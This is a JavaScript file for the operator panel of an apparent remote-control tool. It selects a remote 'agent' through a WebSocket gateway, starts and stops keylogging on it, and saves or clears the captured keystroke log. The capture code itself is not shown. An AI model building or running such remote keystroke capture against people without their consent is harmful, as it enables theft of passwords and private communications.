// ===============================================
// KEYLOG MANAGEMENT FUNCTIONS
// ===============================================

const keylogPanel = document.getElementById('keylog-panel');
const startBtn = document.getElementById('start-keylog-btn');
const stopBtn = document.getElementById('stop-keylog-btn');
const saveBtn = document.getElementById('save-keylog-btn');
const clearBtn = document.getElementById('clear-keylog-btn');

// Helper function: Initialize agent target
function initAgentTarget() {
    const urlParams = new URLSearchParams(window.location.search);
    const agentId = urlParams.get('id');
    
    if (agentId) {
        const checkAndSetTarget = () => {
            if (window.gateway && window.gateway.isAuthenticated) {
                // Đợi agents list được load trước
                if (window.gateway.agentsList && window.gateway.agentsList.length > 0) {
                    window.gateway.setTarget(agentId);
                    console.log(`[Keylog] Đã setTarget đến agent: ${agentId}`);
                } else {
                    // Nếu agents list chưa có, đợi thêm
                    setTimeout(checkAndSetTarget, 500);
                }
            } else {
                setTimeout(checkAndSetTarget, 500);
            }
        };
        setTimeout(checkAndSetTarget, 1000);
    }
}

// Initialize agent target when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initAgentTarget);
} else {
    initAgentTarget();
}

// Start keylog
if (startBtn) {
    startBtn.addEventListener('click', () => {
        if (window.gateway && window.gateway.ws && window.gateway.ws.readyState === WebSocket.OPEN) {
            if (window.startKeylog) {
                window.startKeylog();
            } else {
                console.warn('[Keylog] startKeylog function not available');
                alert('Please connect to gateway first');
            }
        } else {
            alert('Please connect to gateway first');
        }
    });
}

// Stop keylog
if (stopBtn) {
    stopBtn.addEventListener('click', () => {
        if (window.gateway && window.gateway.ws && window.gateway.ws.readyState === WebSocket.OPEN) {
            if (window.stopKeylog) {
                window.stopKeylog();
            } else {
                console.warn('[Keylog] stopKeylog function not available');
            }
        }
    });
}

// Clear keylog
function clearKeylog() {
    if (keylogPanel) {
        keylogPanel.value = '';
        // scrollTop only works for textarea, not input
        if (keylogPanel.tagName === 'TEXTAREA') {
            keylogPanel.scrollTop = 0;
        }
    }
}

if (clearBtn) {
    clearBtn.addEventListener('click', clearKeylog);
}

// Save keylog to file
async function saveKeylogToFile() {
    if (!keylogPanel || !keylogPanel.value.trim()) {
        alert('No keylog data to save');
        return;
    }

    const content = keylogPanel.value;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
    const fileName = `keylog_${timestamp}.txt`;

    try {
        // Try File System Access API (modern browsers)
        if ('showSaveFilePicker' in window) {
            const fileHandle = await window.showSaveFilePicker({
                suggestedName: fileName,
                types: [{
                    description: 'Text files',
                    accept: { 'text/plain': ['.txt'] }
                }]
            });

            const writable = await fileHandle.createWritable();
            await writable.write(content);
            await writable.close();

            alert(`Keylog saved successfully!\nFile: ${fileHandle.name}`);
            clearKeylog();
            return;
        }

        // Fallback to download
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = fileName;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);

        alert(`Keylog downloaded successfully!\nFile: ${fileName}`);
        clearKeylog();
    } catch (error) {
        if (error.name !== 'AbortError') {
            console.error('[Keylog] Error saving file:', error);
            alert('Error saving keylog file: ' + error.message);
        }
    }
}

if (saveBtn) {
    saveBtn.addEventListener('click', saveKeylogToFile);
}

// Export functions
window.clearKeylog = clearKeylog;
window.saveKeylogToFile = saveKeylogToFile;

